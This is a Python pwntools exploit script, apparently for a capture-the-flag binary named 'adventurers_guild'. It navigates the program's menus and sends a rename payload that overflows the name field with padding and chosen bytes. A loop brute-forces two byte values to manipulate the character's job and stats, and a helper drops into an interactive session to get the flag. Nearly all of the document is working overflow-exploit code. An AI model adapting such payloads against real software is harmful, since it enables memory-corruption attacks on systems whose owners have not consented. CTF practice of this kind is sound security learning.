from pwn import *

HOST = ""
PORT = ""
#io = remote(HOST, PORT)
#io = process("./adventurers_guild")

### Running Exploit ####################################################
def navigateMenus(io):
  p = io.recvuntil("=>")
  io.send("1\n")
  p = io.recvuntil("=>")
  io.send("a\n") # Create user
  p = io.recvuntil("=>")
  io.send("2\n")
  p = io.recvuntil("=>")
  io.send("1\n") # select user to rename
  p = io.recvuntil("=>")
  #print(p)

### Payload
name = "[" + "*" * 62 + "]"
testingdata = chr( 0 * 16 + 15 ) + chr( 15 * 16 + 15 )
testingdata = chr(0b00000000) + "\xff"

DEX = '\xFE' #'\x43'
STR = '\xFE'
INT = '\xFE' # \xff is 255, \xfe is 254 etc.
payload= name + testingdata + DEX+STR+INT + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"


def sendPayloadandGetDetails(io, payload):
  io.send(payload + "\n")

  data = []
  for i in range(1): # only 1 person
    p = io.recvuntil("JOB :")
    #print(p)
    job = io.recvuntil("\n").strip()
    print(job)
    p = io.recvuntil("HP  :")
    #print(p)
    hp = int(io.recvuntil("\n"))
    print(hp)
    p = io.recvuntil("ATK :")
    #print(p)
    atk = int(io.recvuntil("\n"))
    print(atk)
    p = io.recvuntil("=>")
    #print(p)
    data.append((job, hp, atk))
  return data
  
def flag(io):
  io.send("3\n")
  io.interactive()

### Running Exploit ##########################

##testing 1

raw_input()

data = []
for i in range(128, 255):
  for j in range(255):
    io = process("./adventurers_guild")
    
    name = "[" + "*" * 62 + "]"
    testingdata = chr( i ) + chr( j )

    DEX = '\xFE' #'\x43'
    STR = '\xFE'
    INT = '\xFE' # \xff is 255, \xfe is 254 etc.
    payload= name + testingdata + DEX+STR+INT + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    
    navigateMenus(io)
    localdata = sendPayloadandGetDetails(io, payload)
    io.close()
    
    
    data.append(localdata[0][0])
    
    print(set(data))
    print(i, j)
    #if localdata[0][0] == "MAGE \xf0\x9f\x94\xa5": exit() # (0, 9)
    #if localdata[0][0][:6] == "ARCHER": exit() # (0, 1)
print(set(data))
